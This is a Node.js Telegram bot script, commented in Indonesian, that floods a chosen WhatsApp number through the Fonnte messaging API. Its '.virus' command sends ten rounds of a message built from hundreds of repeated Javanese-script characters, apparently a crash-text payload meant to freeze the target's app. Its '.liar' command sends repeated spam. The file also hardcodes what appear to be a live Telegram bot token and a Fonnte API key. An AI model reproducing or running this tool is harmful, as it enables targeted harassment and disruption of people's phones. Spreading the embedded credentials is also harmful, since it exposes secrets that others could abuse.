// bot_kirim2_mod_premium.js
// npm install node-telegram-bot-api axios
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8499584477:AAEwTvcdjckwU_vHJ6C2dgUUfqoiKbmUFNQ';
const FONNTE_KEY    = process.env.FONNTE_KEY    || 'XX8gu3vf6FkFrx5aYfvL';
const OWNER_ID      = process.env.OWNER_ID      || '7894053417'; 
if (!TELEGRAM_TOKEN || !FONNTE_KEY || !OWNER_ID) {
  console.error('❌ Harap set TELEGRAM_TOKEN, FONNTE_KEY & OWNER_ID (OWNER_ID = telegram numeric id)');
  process.exit(1);
}

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const sleep = ms => new Promise(r => setTimeout(r, ms));
const makeRepeat = (txt, n) => Array.from({ length: n }).map(() => txt).join('\n');

// ================== EVENT PESAN ==================
bot.on('message', async msg => {
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();

  try {
    // ================== MENU ==================
    if (text === '.menu') {
      if (!fs.existsSync('./nina.jpg'))
        return bot.sendMessage(chatId, '❌ Foto nina.jpg tidak ditemukan!');

      const caption = `
これを入力してください

*MENU*
______________________________
.virus 62×××××
.liar 62×××××

幸運を祈ります！
______________________________

*Dev:* @rifat M rifat
*Name bot:* lawliet bot
*Version:* v3
`;

      const opts = {
        caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: '🧨 MENU ACTION', callback_data: 'menu_bot' }]
          ]
        }
      };

      await bot.sendChatAction(chatId, 'upload_photo');
      await bot.sendPhoto(chatId, fs.readFileSync('./nina.jpg'), opts);
      return;
    }

    // ================== DELETE PREMIUM (OWNER ONLY) ==================
    if (text === '.deleteprem') {
      if (msg.from.id.toString() !== OWNER_ID.toString()) {
        return bot.sendMessage(chatId, '❌ Kamu bukan owner!');
      }
      try {
        if (fs.existsSync('./premium.json')) {
          fs.unlinkSync('./premium.json');
          await bot.sendMessage(chatId, '🗑️ File premium.json berhasil dihapus!');
        } else {
          await bot.sendMessage(chatId, '⚠️ File premium.json tidak ditemukan!');
        }
      } catch (e) {
        await bot.sendMessage(chatId, '❌ Gagal menghapus file premium.json');
      }
      return;
    }

    // ================== VIRUS COMMAND ==================
    if (text.startsWith('.virus')) {
      const parts = text.split(/\s+/);
      const target = parts[1];
      const isi = parts.slice(2).join(' ') || 'ꦾ '.repeat(500);

      if (!target) return bot.sendMessage(chatId, 'Format: .virus 62812xxxx [isi]');

      const payload = makeRepeat(isi, 10); // repeat 10
      const statusMsg = await bot.sendMessage(chatId, `🚀 Mengirim ke *${target}*...`, { parse_mode: 'Markdown' });

      let sukses = 0, gagal = 0;
      const total = 10;

      for (let i = 1; i <= total; i++) {
        try {
          const res = await axios.post('https://api.fonnte.com/send', {
            target: target.trim(),
            message: payload
          }, {
            headers: { Authorization: FONNTE_KEY },
            timeout: 10000
          });

          if (res.data && res.data.status === true) sukses++;
          else gagal++;
        } catch {
          gagal++;
        }

        const bar = '▰'.repeat(i / 2) + '▱'.repeat((total - i) / 2);
        await bot.editMessageText(
          `📤 *Progress ${i}/${total}*\n${bar}\n✅ Sukses: ${sukses}\n❌ Gagal: ${gagal}`,
          { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' }
        );
        await sleep(1000);
      }

      if (fs.existsSync('./mani.jpg')) {
        const caption = `✅ *SUCCESS* send *${target}*\nMereka hanyalah rakyat biasa`;
        await bot.sendPhoto(chatId, fs.readFileSync('./mani.jpg'), { caption, parse_mode: 'Markdown' });
      } else {
        await bot.sendMessage(chatId, `✅ SUCCESS send ${target}\nMereka hanyalah rakyat biasa`);
      }
      return;
    }

    // ================== LIAR COMMAND ==================
    if (text.startsWith('.liar')) {
      const parts = text.split(/\s+/);
      const target = parts[1];
      if (!target) return bot.sendMessage(chatId, 'Format: .liar 62812xxxx');

      const isi = 'halokids';
      const payload = makeRepeat(isi, 10);
      const statusMsg = await bot.sendMessage(chatId, `🔥 Menyerang ke *${target}*...`, { parse_mode: 'Markdown' });

      let sukses = 0, gagal = 0;
      const total = 10;

      for (let i = 1; i <= total; i++) {
        try {
          const res = await axios.post('https://api.fonnte.com/send', {
            target: target.trim(),
            message: payload
          }, {
            headers: { Authorization: FONNTE_KEY },
            timeout: 10000
          });

          if (res.data && res.data.status === true) sukses++;
          else gagal++;
        } catch {
          gagal++;
        }

        const bar = '▰'.repeat(i / 2) + '▱'.repeat((total - i) / 2);
        await bot.editMessageText(
          `📤 *Progress ${i}/${total}*\n${bar}\n✅ Sukses: ${sukses}\n❌ Gagal: ${gagal}`,
          { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' }
        );
        await sleep(1000);
      }

      await bot.sendMessage(chatId, `✅ *Selesai mengirim pesan ke ${target}*\nIsi: ${isi}`);
      return;
    }

  } catch (err) {
    console.error('Error:', err.message);
    await bot.sendMessage(chatId, '❌ Terjadi kesalahan. Cek koneksi atau API key.');
  }
});

// ================== CALLBACK MENU ==================
bot.on('callback_query', async query => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (data === 'menu_bot') {
    if (!fs.existsSync('./mama.jpg'))
      return bot.sendMessage(chatId, '❌ Foto mama.jpg tidak ditemukan!');

    const caption = `
これを入力してください

*MENU*
______________________________
.virus 62×××××
.liar 62×××××

幸運を祈ります！
______________________________

*Dev:* RIFAT
*V:* v3
`;

    await bot.sendChatAction(chatId, 'upload_photo');
    await bot.sendPhoto(chatId, fs.readFileSync('./mama.jpg'), { caption, parse_mode: 'Markdown' });
    await bot.answerCallbackQuery(query.id, { text: '📋 Menampilkan menu bot...' });
  }
});
